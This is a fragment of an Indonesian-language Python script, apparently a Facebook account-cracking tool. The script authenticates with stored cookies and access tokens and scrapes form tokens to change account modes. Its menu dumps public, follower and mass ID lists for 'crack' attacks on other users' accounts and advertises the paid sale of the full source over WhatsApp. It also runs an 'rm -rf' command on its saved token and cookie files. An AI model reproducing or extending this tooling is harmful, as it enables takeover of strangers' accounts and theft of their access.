...
class romz_xyz_ganteng_banget:
	...
	def __init__(self):
		...
		self.hapus = "rm -rf data/token_eaab.txt && rm -rf data/token_eaag.txt && rm -rf data/cookie.txt"
		self.pepek = [
			"romi",
			"Romi",
			"ROMI",
	...
	def sambut(self):
		...
		if 00 <= times < 11:sapa = "Selamat pagi"
		elif 11 <= times < 15:sapa = "Selamat siang"
		elif 15 <= times < 18:sapa = "Selamat sore"
		elif 18 <= times < 23:sapa = "Selamat malam"
	...
	#--- CEK LOGIN 
	def mengecek_login(self,kukis):
		try:
			ykah = ses.get(f"{self.url_mb}/profile.php?v=info",cookies=self.romz_xyz(kukis)).text
			if 'href="/zero/optin/write/' in str(ykah):
				print(f"{u}• {o}anda saat ini menggunakan facebook secara gratis ");jeda(2)
				print(f"{u}• {o}mohon tunggu, sedang mengubah ke mode data");jeda(3)
				xax = re.search('href="/zero/optin/write/?(.*?)"', str(ykah)).group(1).replace("amp;", "")
				xox = ses.get(f"{self.url_mb}/zero/optin/write/{xax}", cookies={"cookie": kukis}) 
				par = parser(xox.text, "html.parser").find("form",{"method":"post"}).replace("amp;", "")
				data = {
					"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(xox.text)).group(1),
					"jazoest" : re.search('name="jazoest" value="(.*?)"', str(xox.text)).group(1)
				}
				post = ses.post(f"{self.url_mb}"+par["action"], data=data, cookies=self.romz_xyz(kukis)) 
				self.jalan(f"{h}√{o} berhasil mengubah facebook gratis ke mode data");jeda(2)
				tulis(Panel(f'{Te}{U}•{O} jalankan ulang tool nya ketik{M}:\n{P} - {H}python bff-2.py',style='#FF0022'));exit()
			elif 'href="/x/checkpoint/' in str(ykah):
	...
	def Menu(self):
		...
		try:
			...
			self.mengecek_login(self.kueh)
			try:
				self.nama = self.roomz.get(f'https://graph.facebook.com/me?fields=name&access_token={self.tokenG}',cookies=self.cokis).json()["name"]
			except:
				try:
					self.get_url = self.roomz.get(f"{self.url_mb}/profile.php?v=info",cookies=self.romz_xyz(self.kueh)).text 
					self.nama = re.findall("\<title\>(.*?)<\/title\>",self.get_url)[0]
					if "Konten Tidak Ditemukan" in self.nama or "Content not found" in self.nama:
						os.system (self.hapus)
						exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
					elif "Epsilon" in self.nama or "checkpoint" in self.nama:
						os.system (self.hapus)
						exit ("%s╰─%s akun checkpoint "%(p,m));jeda(2)
					elif "Anda Diblokir Sementara" in self.nama:
						os.system (self.hapus)
						exit ("%s╰─%s akun terkena spam "%(p,m));jeda(2)
					else:pass 
		...
		tulis(Panel(f"""{Te}{P} # {O}{self.sambut()} {H}{self.nama} \n
 ...
 {U}•{P} 09 {O}Crack dari cloning gmail          \n {U}•{P} 10 {O}Full open source code {H}200k
 {U}•{P} 11 {O}Menu tambahan                        \n {U}•{M} 00 {O}Keluar  """,
		...
		if slut in['',' ']:
			...
			if "accessTokenNotFound" in (self.tokenB,self.tokenG):
				try:dumpid(self.tokenB,self.tokenG,self.cokis).PublikCookie()
				except ValueError:exit()
			else:
				gan = input ("%s╰─%s anda ingin crack massal id? y/t%s >%s "%(p,o,m,k))
				if gan in['']:exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				elif gan in['y','Y']:dumpid(self.tokenB,self.tokenG,self.cokis).MassalPublikGRAPH()
				elif gan in['t','T']:dumpid(self.tokenB,self.tokenG,self.cokis).PublikGRAPH()
				else:exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
							
		elif slut in['2','02']:
			if "accessTokenNotFound" in (self.tokenB,self.tokenG):
				try:dumpid(self.tokenB,self.tokenG,self.cokis).FollowCookie()
				except ValueError:exit() 
			else:dumpid(self.tokenB,self.tokenG,self.cokis).FollowPublikGRAPH()
 ...
 {U}•{P} 03 {O}Permintaan terkirim """,
			...
			os.system("xdg-open https://wa.me/+6281273018924?text=Assalamualaikum+saya+mau+beli+file+open+source+code+nya");exit()
			exit()
